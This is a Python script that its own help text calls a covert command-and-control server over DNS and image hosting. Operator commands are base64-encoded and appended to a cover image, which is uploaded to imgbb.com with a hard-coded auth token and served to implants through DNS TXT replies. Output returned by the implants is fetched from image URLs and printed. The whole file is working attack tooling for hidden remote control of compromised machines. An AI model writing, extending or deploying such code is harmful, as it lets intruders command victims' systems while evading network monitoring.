#!/usr/bin/python3

from dnslib import *
from dnslib.server import *
from base64 import *
import re
import httpx
import asyncio
import time
import queue
import threading
import argparse


def create_image(file_path, cmd_bytes):
    with open(file_path, 'rb') as f:
        data = f.read()
    delimiter = rb"\x43\123\34x\23\x123\x666"
    encrypted_cmd = b64encode(cmd_bytes)
    return data + delimiter + encrypted_cmd

async def get_img_url(final_bytes):
	async with httpx.AsyncClient(verify=False) as client:
		url = 'https://imgbb.com/json'
		file = {'source': ('fucker.png', final_bytes)}
		data = {
			'type': 'file', 
			'action': 'upload',
			'timestamp': str(int(time.time() * 1000)),
			'auth_token': '35309ae7342a854a252d32a9b3beac1017dd4f73'
		}
		r = await client.post(url=url, files=file, data=data)
		img_json = r.json()
		img_url = img_json['image']['url']
	return img_url

command_queue = queue.Queue()

def main():
    while True:
        cmd = input('$ ').encode()
        if cmd.lower().decode() == 'exit':
            break
        command_queue.put(cmd)

threading.Thread(target=main, daemon=True).start()

class txtresolver:
    def __init__(self, cover_image_path):
        self.cover_image_path = cover_image_path

    def resolve(self, request, handler):
        reply = request.reply()
        qtype = request.q.qtype

        if qtype == QTYPE.TXT:
            data = str(request.q.qname).split('.')
            if data[0] == 'check':
                if not command_queue.empty():
                    cmd = command_queue.get_nowait()
                    final_bytes = create_image(self.cover_image_path, cmd)
                    image_url = b64encode(asyncio.run(get_img_url(final_bytes)).encode())
                    reply.add_answer(RR(rname=str(request.q.qname), rtype=QTYPE.TXT, rdata=TXT(image_url), ttl=60))
            else:
                with httpx.Client(verify=False) as client: 
                    output_url = b64decode(data[0]).decode()
                    req = client.get(url=output_url)
                    output = req.content.split(r"\x43\123\34x\23\x123\x666".encode())[1]
                    if output == None:
                        pass
                    print(b64decode(output).decode())
                
        return reply

parser = argparse.ArgumentParser(description="Covert C2 over DNS and image hosting (Antisocial)")
parser.add_argument("-l", "--lhost", required=True, help="Local IP for DNS server")
parser.add_argument("-p", "--lport", required=True, type=int, help="Local port for DNS server")
parser.add_argument("-i", "--image-file", required=True, help="Cover image file (JPEG/PNG)")
args = parser.parse_args()

resolver = txtresolver(args.image_file)
server = DNSServer(resolver, port=args.lport, address=args.lhost, logger=None)
server.start()